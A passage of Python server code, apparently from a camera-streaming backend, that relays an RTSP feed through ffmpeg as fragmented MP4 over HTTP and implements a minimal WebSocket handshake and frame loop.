            "ffmpeg", "-loglevel", "quiet",
            "-fflags", "nobuffer",
            "-flags", "low_delay",
            "-probesize", "32",
            "-analyzeduration", "0",
            "-rtsp_transport", "tcp",
            "-i", cam_path,
            "-vf", "fps=20,scale=640:-1,vflip,hflip",
            "-c:v", "libx264",
            "-preset", "ultrafast",
            "-tune", "zerolatency",
            "-profile:v", "baseline",
            "-level", "3.0",
            "-b:v", "800k",
            "-an",
            "-f", "mp4",
            "-movflags", "frag_keyframe+empty_moov+default_base_moof",
            "pipe:1"
        ]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            while True:
                chunk = proc.stdout.read(65536)
                if not chunk:
                    break
                try:
                    self.wfile.write(chunk)
                    self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError, OSError):
                    proc.terminate()
                    return
            proc.wait()
        except Exception:
            pass
        finally:
            try:
                proc.terminate()
            except Exception:
                pass

    # -- websocket ----------------------------------------------------------
    def _ws(self):
        key = self.headers.get("Sec-WebSocket-Key")
        if not key:
            return self._json(400, {"error": "missing Sec-WebSocket-Key"})
        accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
        self.send_response(101)
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept)
        self.end_headers()

        client = WSClient(self.connection)
        HUB.add(client)
        self.close_connection = True
        try:
            self._ws_loop(client)
        except Exception:
            pass
        finally:
            HUB.remove(client)
            client.close()

    def _ws_loop(self, client):
        rf = self.rfile
        while True:
            h = rf.read(2)
            if not h or len(h) < 2:
                break
            b1, b2 = h[0], h[1]
            opcode = b1 & 0x0F
            masked = b2 & 0x80
            ln = b2 & 0x7F
            if ln == 126:
                ln = struct.unpack(">H", rf.read(2))[0]
            elif ln == 127:
                ln = struct.unpack(">Q", rf.read(8))[0]
            mask = rf.read(4) if masked else b"\x00\x00\x00\x00"
            payload = rf.read(ln) if ln else b""
            if masked and payload:
                payload = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))
            if opcode == 0x8:          # close
                break
            if opcode == 0x9:          # ping -> pong
                client.pong(payload)
            # text/binary/pong from client are ignored (control channel is REST)


def main():
    httpd = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    httpd.daemon_threads = True
    print(f"[rtops] backend listening on :{PORT}  frontend={FRONTEND}", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
